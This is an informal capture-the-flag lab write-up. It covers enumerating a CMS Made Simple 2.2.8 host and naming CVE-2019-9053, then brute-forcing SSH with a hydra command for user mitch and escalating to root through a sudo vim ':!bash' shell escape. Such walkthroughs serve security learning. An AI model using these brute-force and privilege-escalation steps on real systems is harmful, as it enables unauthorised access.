With searchsploit I could not find the actualt CVE which can can exploit it

Then I used gobuster and found ---> directory called simple

-----> Found cms made simple version 2.2.8  was running, was written in the bottom of the web page.

CVE-2019-9053

SQLi

I tried with the exploit code but it failed for me probably due to this reason why Exploit-DB didn't verified it.

I enumerated ftp server and got a file called ForMitch.txt

-----> username: Mitch

hydra -l mitch -P "/usr/share/seclists/Passwords/Common-Credentials/best110.txt" -e nsr -s 2222 10.10.84.167 ssh

user.txt ----> G00d j0b, keep up!

For Priv Escal:

$ sudo -l

---> (root) NOPASSWD: /usr/bin/vim

So, I used:

$ vim 

Then in command mode--->

:!bash

Then I got: bash shell --> mitch@Machine:~$

But I didn't used sudo for priv escal:

mitch@Machine:~$ sudo vim

Then in command mode --->

:!bash

THen I got .... root@Machine:~#
